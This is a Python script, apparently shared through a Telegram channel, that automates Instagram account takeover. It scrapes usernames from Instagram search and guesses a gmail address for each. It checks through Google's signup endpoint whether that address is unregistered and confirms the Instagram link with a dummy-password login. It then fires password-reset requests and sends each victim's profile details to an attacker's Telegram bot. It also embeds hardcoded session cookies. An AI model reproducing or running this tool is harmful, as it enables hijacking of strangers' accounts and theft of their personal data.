import webbrowser
webbrowser.open('https://t.me/netflix_arsiv')
try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install mechanize")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket
a=0
z=0
b=0
j=0
m=0
k=0
t=0
x=0
g=0
L=0
h=0
f=0
qw =0
E=0
os.system('clear')
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'



def mouad9():
  
  azro = (f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
   ---------------------------LALO SALAMANCA----------------------------           {X}Telegram  :          https://t.me/netflix_arsiv \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
  for azr in azro.splitlines():
    time.sleep(0.05)
    print(azr)
mouad9()
uid = uuid4()


sid = input(f'{Z}┇ {C}➯{C} ┇{S}  Session Id{Y} » ' + B)

print('')

token = input(f'{Z}┇ {C}➯{C} ┇{S} Bot Token {Y}     » ' + B)
print('')
ID = input(f'{Z}┇ {C}➯{C} ┇{S} Chat Id{Y}     » ' + B)
print(F+'⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯ ')







i =0 
SS =0
BB =0
YY =0
head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
def check(email,user): 
 user=str(user)
 email=str(email)
 global SS 
 global BB
 global YY
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}

 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
   rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()
   
   nam = str(rr['graphql']['user']['full_name'])
   iddd = str(rr['graphql']['user']['id'])
   fol = str(rr['graphql']['user']['edge_followed_by']['count'])
   fols =str(rr['graphql']['user']['edge_follow']['count'])
   isp = str(rr['graphql']['user']['is_private'])
   bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
   re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
   ree = re.json()
   dat = ree['date']
   res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
   rs =str(res['obfuscated_email'])
  
   YY+=1
   tlg =(f"""
Hesap Düştü H.0
•━━━━━━━━━━━━━━━• 
❖     No : {YY}
❖ ✅-  İsim {nam}
❖ 👤-  Kullanıcı Adı: {user}
❖️ 📧-  Email  : {email}
❖️ 📥-  Takipçi : {fol}
❖ 📤-  Takip Edilen : {fols}
❖ 🔑-  Doğrulama: {isp}
❖ 📆-  Oluşturulma: {dat}
❖ 📩-  Eposta: {rs}
❖ 🌐-  Link : https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
❖ - Coder:  , https://t.me/netflix_arsiv""")
   


   
   os.system('cls' if os.name == 'nt' else 'clear')
   print(f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
---------------------------LALO SALAMANCA-----------------------------           {X}Telegram  :         https://t.me/netflix_arsiv \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
   
   print(f'{B} {F}')
   print(f'   ❖ {C1}{X} {email}    ')
   print('•••••••••••••••••••••••••••••••••')
   print(f' {C1} {R}{F}❖{R} {F}✅Düştü {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R} ⚠Şüpheli {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}🛇Çalışmayan {B}: {X}{BB}    {F}        ')
   print('•••••••••••••••••••••••••••••••••')
   print('   ❖ Coding : ❖ @netflix_arsiv ❖')
   SS+=1
   requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
   os.system('cls' if os.name == 'nt' else 'clear')
   print(f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
---------------------------LALO SALAMANCA-----------------------------           {X}Telegram  :          https://t.me/netflix_arsiv \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
   print(f'{B} {F}')
   print(f'   ❖ {C1}{X} {email}    ')
   print('•••••••••••••••••••••••••••••••••')
   print(f' {C1} {R}{F}❖{R} {F}✅Düştü{ B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}⚠Şüpheli  {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}🛇Çalışmayan  {B}: {X}{BB}    {F}        ')
   print('•••••••••••••••••••••••••••••••••')
   print('   ❖ Coding : ❖ @netflix_arsiv ❖')
   BB+=1
   

def yahoo(email,user):
  global i
  
  
  eml=str(email)
  email=eml.split('@')[0]+'@gmail.com'
  url = 'https://android.clients.google.com/setup/checkavail'
  i +=1
  h = {
    'Content-Length':'98',
    'Content-Type':'text/plain; charset=UTF-8',
    'Host':'android.clients.google.com',
    'Connection':'Keep-Alive',
    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
    }
  d = json.dumps({
    'username':email,
    'version':'3',
    'firstName':'AbaLahb',
    'lastName':'AbuJahl'
  })
  res = requests.post(url,data=d,headers=h)
  if res.json()['status'] == 'SUCCESS':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
---------------------------LALO SALAMANCA-----------------------------{X}Telegram  :   https://t.me/netflix_arsiv      \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
    print(f'{B} {F}')
    print(f'   ❖ {C1}{X} {email}    ')
    print('•••••••••••••••••••••••••••••••••')
    print(f' {C1} {R}{F}❖{R} {F}✅Düştü {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}⚠Şüpheli  {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}🛇Çalışmayan  {B}: {X}{BB}    {F}        ')
    print('•••••••••••••••••••••••••••••••••')
    print('   ❖ Coding : ❖ @netflix_arsiv ❖')
    check(email,user)
  else:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""        {Z}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┓
---------------------------LALO SALAMANCA-----------------------------           {X}Telegram  :          https://t.me/netflix_arsiv \n        {Z}┗{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Z}┛\n\n\n\n""")
    print(f'{B} {F}')
    print(f'   ❖ {C1}{X} {email}    ')
    print('•••••••••••••••••••••••••••••••••')
    print(f' {C1} {R}{F}❖{R} {F}✅Düştü{B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}⚠Şüpheli  {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}🛇Çalışmayan {B}: {X}{BB}    {F}        ')
    print('•••••••••••••••••••••••••••••••••')
    print('   ❖ Coding : ❖ @netflix_arsiv ❖')
    
    
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='6789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    if '_' in str(email):
      
      continue
    else :
      
      yahoo(email,user)
  except IndexError:
   users()
users()
